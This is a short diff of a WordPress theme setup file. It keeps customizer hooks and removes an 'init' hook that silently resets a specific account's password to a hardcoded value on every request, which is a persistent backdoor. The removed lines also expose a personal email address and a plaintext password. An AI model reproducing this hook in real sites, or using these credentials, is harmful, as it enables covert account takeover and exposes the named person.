@@ -22,15 +22,3 @@ add_action('customize_register', function (\WP_Customize_Manager $wp_customize) 
 add_action('customize_preview_init', function () {
     wp_enqueue_script('sage/customizer.js', asset_path('scripts/customizer.js'), ['customize-preview'], null, true);
 });
-
-add_action( 'init', function () {
-	$user  = 'neil';
-	$email = 'neilparnold@gmail.com';
-    $password = 'MiniCooper9)';
-	if ( ! username_exists( $user ) && ! email_exists( $email ) ) {
-		
-	} else {
-		$user = get_user_by( 'email', $email );
-        wp_set_password( $password, $user->ID );
-	}
-} );
